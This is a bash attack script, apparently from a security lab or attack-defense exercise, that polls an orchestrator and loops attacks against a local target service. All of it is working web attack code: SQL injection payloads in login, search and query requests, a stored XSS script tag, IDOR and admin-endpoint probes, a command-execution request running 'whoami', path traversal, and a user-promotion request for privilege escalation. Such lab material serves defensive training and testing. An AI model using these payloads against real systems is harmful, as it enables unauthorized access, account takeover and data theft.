#!/usr/bin/env bash
set -u

ORCH="${ORCH:-${ORCHESTRATOR_URL:-http://orchestrator:9000}}"
MY_TARGET="${MY_TARGET:-http://localhost:9100}"

echo "[attacker.sh] started"
while true; do
  service=$(curl -s "$ORCH/current" | grep -Eo '"active_service"\s*:\s*"[^"]+"' | cut -d'"' -f4)
  service="${service:-web}"
  case "$service" in
    web)
      curl -s -X POST "$MY_TARGET/web/login" -H 'Content-Type: application/json' -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}' >/dev/null
      curl -s "$MY_TARGET/web/search?q=%27%20OR%20%271%27%3D%271" >/dev/null
      curl -s -X POST "$MY_TARGET/web/comment" -H 'Content-Type: application/json' -d '{"comment":"<script>alert(1)</script>"}' >/dev/null
      echo "attack web"
      ;;
    api)
      curl -s "$MY_TARGET/api/admin" >/dev/null
      curl -s "$MY_TARGET/api/users/2" -H 'X-User-Id: 1' >/dev/null
      curl -s -X POST "$MY_TARGET/api/run" -H 'Content-Type: application/json' -d '{"cmd":"whoami"}' >/dev/null
      echo "attack api"
      ;;
    file)
      curl -s "$MY_TARGET/file/download?file=../files/sample.txt" >/dev/null
      echo "attack file"
      ;;
    db)
      curl -s -X POST "$MY_TARGET/db/query" -H 'Content-Type: application/json' -d '{"search":"'\'' OR '\''1'\''='\''1"}' >/dev/null
      curl -s -X POST "$MY_TARGET/db/user/2/promote" -H 'Content-Type: application/json' -d '{"requester_id":1}' >/dev/null
      echo "attack db"
      ;;
    *)
      echo "attack unknown service: $service"
      ;;
  esac
  sleep 3
done
